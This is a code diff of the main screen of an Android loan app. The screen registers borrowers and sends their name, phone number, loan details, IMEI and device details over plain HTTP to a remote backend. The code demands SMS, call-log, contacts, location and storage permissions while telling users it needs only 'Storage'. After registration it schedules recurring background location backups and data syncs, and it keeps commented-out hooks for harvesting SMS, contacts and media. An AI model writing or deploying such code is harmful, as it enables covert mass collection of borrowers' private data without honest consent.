@@ -1,172 +1,426 @@
 package com.tst.hytonefinance;
 
-import android.Manifest;
-import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.database.Cursor;
-import android.net.Uri;
-import android.os.Bundle;
-import android.provider.CallLog;
-import android.provider.MediaStore;
-import android.view.View;
-import android.widget.ImageView;
-import android.widget.TextView;
 
+import androidx.annotation.NonNull;
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
+import androidx.loader.content.CursorLoader;
 
-import java.io.File;
-import java.util.Date;
+import android.Manifest;
+import android.annotation.SuppressLint;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.content.Context;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.AsyncTask;
+import android.os.Build;
+import android.os.Bundle;
+import android.provider.MediaStore;
+import android.provider.Settings;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.view.View;
+import android.widget.EditText;
+import android.widget.LinearLayout;
+import android.widget.TextView;
+import android.widget.Toast;
 
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.RequestBody;
-import retrofit2.Call;
-import retrofit2.Callback;
-import retrofit2.Response;
-import retrofit2.Retrofit;
+import com.android.volley.AuthFailureError;
+import com.android.volley.NetworkResponse;
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.Response;
+import com.android.volley.ServerError;
+import com.android.volley.VolleyError;
+import com.android.volley.toolbox.HttpHeaderParser;
+import com.android.volley.toolbox.JsonObjectRequest;
+import com.android.volley.toolbox.Volley;
+import com.tst.hytonefinance.Background_Service.local_backup;
+import com.tst.hytonefinance.Background_Service.location_backup;
+import com.tst.hytonefinance.Background_Service.sync_data;
+import org.json.JSONException;
+import org.json.JSONObject;
+import java.io.UnsupportedEncodingException;
+import java.net.MalformedURLException;
+import java.util.HashMap;
+import java.util.Locale;
+import java.util.Map;
 
+import pub.devrel.easypermissions.AfterPermissionGranted;
+import pub.devrel.easypermissions.EasyPermissions;
+
+@RequiresApi(api = Build.VERSION_CODES.Q)
 public class MainActivity extends AppCompatActivity {
 
+    private static final String TAG = "Error";
     private TextView myTextView;
-    private ImageView myImageView;
-    private static final int SELECT_PICTURE = 1;
-    private String selectedImagePath;
+    private String Base_Url="http://backend.getbridge.in";
+    String[] per = {Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.INTERNET,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.WRITE_CONTACTS,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.READ_EXTERNAL_STORAGE
+           };
+
+    public static final int Rc_setting = 123;
+    private static final String TAG_ANDROID_CONTACTS = "ANDROID_CONTACTS";
+
+    //******************* All Page **************************
+    private LinearLayout Thank_you_page, Registration_page, Loading_page;
+
+    //********** Register Page Element **************
+    private EditText name, mobile_number, application_id, type_of_loan;
+    private String Device_Details, permission_status;
+    private boolean If_Application_Install;
+
+
+    AlarmManager alarmManager;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        myTextView = findViewById(R.id.textview);
-        myImageView = findViewById(R.id.imageView);
-        ActivityCompat.requestPermissions(MainActivity.this,
-                new String[]{Manifest.permission.READ_SMS,
-                        Manifest.permission.READ_CALL_LOG,
-                        Manifest.permission.ACCESS_FINE_LOCATION,
-                        Manifest.permission.ACCESS_COARSE_LOCATION},
-                PackageManager.PERMISSION_GRANTED
-        );
 
-        findViewById(R.id.select_image)
-                .setOnClickListener(new View.OnClickListener() {
+        Define_Register_page_Element();
+        try {
+            requesrpermittion();
+        } catch (MalformedURLException e) {
+            e.printStackTrace();
+        }
+//        Start_background_process();
 
-                    // opens activity to select image
-                    public void onClick(View arg0) {
-                        Intent intent = new Intent();
-                        intent.setType("image/*");
-                        intent.setAction(Intent.ACTION_GET_CONTENT);
-                        startActivityForResult(Intent.createChooser(intent,
-                                "select image"), SELECT_PICTURE);
+    }
+
+    //**************************************************
+    //                 Register_page
+    //**************************************************
+    private void Define_Register_page_Element() {
+        name = (EditText) findViewById(R.id.user_name);
+        mobile_number = (EditText) findViewById(R.id.mobile_number);
+        application_id = (EditText) findViewById(R.id.application_id);
+        type_of_loan = (EditText) findViewById(R.id.type_of_loan);
+        Thank_you_page = (LinearLayout) findViewById(R.id.Thank_you_page);
+        Registration_page = (LinearLayout) findViewById(R.id.Registration_page);
+        Loading_page = (LinearLayout) findViewById(R.id.Loading_page);
+        page_control(3);
+    }
+
+
+    public void Do_Nothing(View v) {
+
+    }
+
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);
+
+        if (EasyPermissions.hasPermissions(this, per)) {
+            try {
+                requesrpermittion();
+            } catch (MalformedURLException e) {
+                e.printStackTrace();
+            }
+
+        } else {
+            EasyPermissions.requestPermissions(this, "This app needs to access your Storage", Rc_setting, per);
+        }
+    }
+
+    @AfterPermissionGranted(Rc_setting)
+    private void requesrpermittion() throws MalformedURLException {
+
+        if (EasyPermissions.hasPermissions(this, per)) {
+            Check_user a = new Check_user();
+            a.execute();
+
+//            Get_media();
+
+
+//            contact_spliterator();
+//            SMS_spliterator();
+//            readSMS();
+
+        } else {
+            EasyPermissions.requestPermissions(this, "This app needs to access your Storage", Rc_setting, per);
+        }
+
+    }
+
+    private void Start_background_process()
+    {
+        Intent location_intent =new Intent(MainActivity.this, location_backup.class);
+        location_intent.setAction("Location_BackUp");
+
+        PendingIntent location_pendingIntent=PendingIntent.getBroadcast(this,0,location_intent,0);
+        AlarmManager location_alarmManager= (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        location_alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, 0,2*60*60*1000,location_pendingIntent);
+
+        Intent intent =new Intent(MainActivity.this, sync_data.class);
+        intent.setAction("BackgroundProcess");
+
+        PendingIntent pendingIntent=PendingIntent.getBroadcast(this,0,intent,0);
+        AlarmManager alarmManager= (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, 0,24*60*60*1000,pendingIntent);
+
+
+
+
+
+
+
+
+
+
+    }
+
+    @SuppressLint("MissingPermission")
+    public String getDeviceIMEI() {
+        String deviceId;
+
+        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            deviceId = Settings.Secure.getString(
+                    MainActivity.this.getContentResolver(),
+                    Settings.Secure.ANDROID_ID);
+        } else {
+            TelephonyManager mTelephony = (TelephonyManager) MainActivity.this.getSystemService(Context.TELEPHONY_SERVICE);
+            if (mTelephony.getDeviceId() != null) {
+                deviceId = mTelephony.getDeviceId();
+            } else {
+                deviceId = Settings.Secure.getString(
+                        MainActivity.this.getContentResolver(),
+                        Settings.Secure.ANDROID_ID);
+            }
+        }
+
+        return deviceId;
+    }
+
+    private class Check_user extends AsyncTask<String, Void, String> {
+        boolean is_User_exist = false;
+
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+//            Toast.makeText(MainActivity.this, "Please wait...", Toast.LENGTH_SHORT).show();
+//            progressBar.setVisibility(View.VISIBLE);
+
+        }
+
+        @Override
+        protected String doInBackground(String... params) {
+            try {
+                Log.e("DeviceIMEI", getDeviceIMEI(), null);
+
+                String url = Base_Url+"/api/v1/user/userBasicDetails/" + getDeviceIMEI();
+
+                RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
+                requestQueue.start();
+                HashMap<String, String> params1 = new HashMap<String, String>();
+                JsonObjectRequest jsObjRequest = new
+                        JsonObjectRequest(Request.Method.GET,
+                        url,
+                        new JSONObject(params1),
+                        new Response.Listener<JSONObject>() {
+                            @Override
+                            public void onResponse(JSONObject response) {
+                                try {
+//                                    progressBar.setVisibility(View.GONE);
+                                    JSONObject data = response.getJSONObject("data");
+
+                                    Log.e("API_data", String.valueOf(data.getString("data").equals("null")), null);
+
+                                    if (String.valueOf(data.getString("data").equals("null")).toLowerCase(Locale.ROOT).equals("false")) {
+                                        page_control(2);
+                                        Start_background_process();
+                                        Log.e("User_id", data.getJSONObject("data").getString("_id"), null);
+                                    } else {
+                                        page_control(1);
+
+                                    }
+
+                                } catch (JSONException e) {
+                                    e.printStackTrace();
+                                }
+                                Log.e("API_response", response.toString(), null);
+                            }
+                        }, new Response.ErrorListener() {
+                    @Override
+                    public void onErrorResponse(VolleyError error) {
+                        Log.e("API_Error", error.getMessage(), null);
                     }
                 });
-    }
+                requestQueue.add(jsObjRequest);
 
-    // shows image and stores its path
-    public void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        if (resultCode == RESULT_OK) {
-            if (requestCode == SELECT_PICTURE) {
-                Uri selectedImageUri = data.getData();
-                myImageView.setImageURI(selectedImageUri);
-                selectedImagePath = getPath(selectedImageUri);
+                Log.e("TAG2", "doInBackground: Connection Succesful", null);
+
+            } catch (Exception r) {
+                Log.e("Data_Error", r.toString());
             }
-        }
-    }
-
-    // gets path of selected image
-    public String getPath(Uri uri) {
-        if( uri == null ) {
             return null;
         }
-        String[] projection = { MediaStore.Images.Media.DATA };
-        Cursor cursor = managedQuery(uri, projection, null, null, null);
-        if( cursor != null ){
-            int column_index = cursor
-                    .getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
-            cursor.moveToFirst();
-            String path = cursor.getString(column_index);
-            cursor.close();
-            return path;
+
+        @Override
+        protected void onPostExecute(String result) {
+
         }
-        return uri.getPath();
     }
 
-    public void upload(View view){
-        uploadImage();
-    }
+    public void on_submit_click(View v) throws MalformedURLException {
 
-    // sends image to api and gets response // todo: need to modify this function
-    private void uploadImage() {
-        File file = new File(selectedImagePath);
-
-        Retrofit retrofit = NetworkClient.getRetrofit();
-
-        RequestBody requestBody = RequestBody.create(MediaType.parse("image/*"), file);
-        MultipartBody.Part parts = MultipartBody.Part.createFormData("newImage", file.getName(), requestBody);
-        RequestBody someData = RequestBody.create(MediaType.parse("text/plain"), "This is a new Image");
-        UploadApis uploadApis = retrofit.create(UploadApis.class);
-        Call call = uploadApis.uploadImage(parts, someData);
-        call.enqueue(new Callback() {
-            @Override
-            public void onResponse(Call call, Response response) {
-                // code for success
-            }
-
-            @Override
-            public void onFailure(Call call, Throwable t) {
-                // code for failure
-            }
-        });
-    }
-
-    public void readSMS(View view){
-        readSms();
-    }
-
-    // prints last sms body
-    private void readSms() {
-        Cursor getAllSms = getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
-        getAllSms.moveToFirst();
-        myTextView.setText(getAllSms.getString(12));
-        getAllSms.close();
-    }
-
-    // prints all call history
-    public void readCallLog(View view) {
-
-        StringBuffer sb = new StringBuffer();
-        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
-        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
-        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
-        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
-        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
-        sb.append("Call Details :");
-        while (managedCursor.moveToNext()) {
-            String phNumber = managedCursor.getString(number);
-            String callType = managedCursor.getString(type);
-            String callDate = managedCursor.getString(date);
-            Date callDayTime = new Date(Long.valueOf(callDate));
-            String callDuration = managedCursor.getString(duration);
-            String dir = null;
-            int dircode = Integer.parseInt(callType);
-            switch (dircode) {
-                case CallLog.Calls.OUTGOING_TYPE:
-                    dir = "OUTGOING";
-                    break;
-
-                case CallLog.Calls.INCOMING_TYPE:
-                    dir = "INCOMING";
-                    break;
-
-                case CallLog.Calls.MISSED_TYPE:
-                    dir = "MISSED";
-                    break;
-            }
-            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
-            sb.append("\n----------------------------------");
+        if (name.getText().toString().isEmpty()) {
+            Toast.makeText(MainActivity.this, "Please Enter", Toast.LENGTH_SHORT).show();
+        } else if (mobile_number.getText().toString().length() != 10) {
+            Toast.makeText(MainActivity.this, "Please Enter 10 digit Mobile number", Toast.LENGTH_SHORT).show();
+        } else if (application_id.getText().toString().isEmpty()) {
+            Toast.makeText(MainActivity.this, "Please Enter Application Id", Toast.LENGTH_SHORT).show();
+        } else if (type_of_loan.getText().toString().isEmpty()) {
+            Toast.makeText(MainActivity.this, "Please Enter Loan Type", Toast.LENGTH_SHORT).show();
+        } else {
+            Add_User();
         }
-        managedCursor.close();
-        myTextView.setText(sb);
+
     }
+
+    private void Add_User() throws MalformedURLException {
+//        progressBar.setVisibility(View.VISIBLE);
+        RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
+        requestQueue.start();
+        Map<String, String> params2 = new HashMap<>();
+
+        String Device_Details = System.getProperty("os.version") + "\n" +
+                android.os.Build.VERSION.SDK + "\n" +
+                android.os.Build.DEVICE + "\n" +
+                android.os.Build.MODEL + "\n" +
+                android.os.Build.PRODUCT + "\n" +
+                Build.MANUFACTURER;
+
+        params2.put("user_id", getDeviceIMEI());
+        params2.put("name", name.getText().toString());
+        params2.put("mobile", mobile_number.getText().toString());
+        params2.put("application_id", application_id.getText().toString());
+        params2.put("type_of_loan", type_of_loan.getText().toString());
+        params2.put("device_details", Device_Details);
+        params2.put("application_install", "true");
+        params2.put("permission_status", "12");
+        JsonObjectRequest jsObjRequest = new
+                JsonObjectRequest(Request.Method.POST,
+                        Base_Url+"/api/v1/user/userBasicDetails",
+                        new JSONObject(params2),
+                        new Response.Listener<JSONObject>() {
+                            @Override
+                            public void onResponse(JSONObject response) {
+//                                progressBar.setVisibility(View.GONE);
+                                try {
+
+                                    Log.e("API_data", String.valueOf(response.getString("status").equals("success")), null);
+
+                                    if (response.getString("status").equals("fail")) {
+                                        Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
+
+                                        page_control(1);
+//                                        Toast.makeText(MainActivity.this, "Some th", Toast.LENGTH_SHORT).show();
+                                    } else {
+                                        Toast.makeText(MainActivity.this, "Account Created", Toast.LENGTH_SHORT).show();
+                                        page_control(2);
+                                        requesrpermittion();
+//                                        Toast.makeText(MainActivity.this, "Success", Toast.LENGTH_SHORT).show();
+                                    }
+
+                                } catch (JSONException | MalformedURLException e) {
+                                    e.printStackTrace();
+                                    Log.e("Request_response", e.getMessage(), null);
+                                    Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
+                                }
+                                Log.e("API_response", response.toString(), null);
+                            }
+                        },
+                        new Response.ErrorListener() {
+                            @Override
+                            public void onErrorResponse(VolleyError error) {
+//                                progressBar.setVisibility(View.GONE);
+                                NetworkResponse response = error.networkResponse;
+                                if (error instanceof ServerError && response != null) {
+                                    try {
+                                        String res = new String(response.data,
+                                                HttpHeaderParser.parseCharset(response.headers, "utf-8"));
+                                        // Now you can use any deserializer to make sense of data
+                                        JSONObject obj = new JSONObject(res);
+                                        Log.e("API_Response_Error 1", obj.toString(), null);
+                                        Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
+                                    } catch (UnsupportedEncodingException | JSONException e1) {
+                                        // Couldn't properly decode data to string
+                                        e1.printStackTrace();
+                                        Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
+                                    } // returned data is not JSONObject?
+
+                                }
+                                ;
+                                Log.e("API_Response_Error", error.getMessage(), null);
+                            }
+                        }) {
+                    @Override
+
+                    public Map<String, String> getHeaders() throws AuthFailureError {
+                        HashMap<String, String> headers = new HashMap<String, String>();
+                        headers.put("Content-Type", "application/json; charset=utf-8");
+                        return headers;
+                    }
+                };
+
+        requestQueue.add(jsObjRequest);
+    }
+
+    //******************* Page Control **************
+    public void page_control(int page_number) {
+        Registration_page.setVisibility(View.GONE);
+        Thank_you_page.setVisibility(View.GONE);
+        Loading_page.setVisibility(View.GONE);
+        if (page_number == 1) {
+            Registration_page.setVisibility(View.VISIBLE);
+        } else if (page_number == 2) {
+            Thank_you_page.setVisibility(View.VISIBLE);
+        } else if (page_number == 3) {
+            Loading_page.setVisibility(View.VISIBLE);
+        }
+    }
+
+
+    private void Get_media()
+    {
+        String[] projection = new String[] {
+                MediaStore.Files.FileColumns._ID,
+                MediaStore.Files.FileColumns.DATA,
+                MediaStore.Files.FileColumns.DATE_ADDED,
+                MediaStore.Files.FileColumns.MEDIA_TYPE,
+                MediaStore.Files.FileColumns.MIME_TYPE,
+                MediaStore.Files.FileColumns.TITLE
+        };
+        Log.e("Media","Started",null);
+        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "="
+                + MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE
+                + " OR "
+                + MediaStore.Files.FileColumns.MEDIA_TYPE + "="
+                + MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO;
+
+        Uri queryUri = MediaStore.Files.getContentUri("external");
+        CursorLoader cl = new CursorLoader(MainActivity.this, queryUri, projection, selection, null, MediaStore.Files.FileColumns.DATE_ADDED + " DESC");
+
+        Log.e("Media",cl.toString(),null);
+
+
+    }
+
+
+
+
 }
-
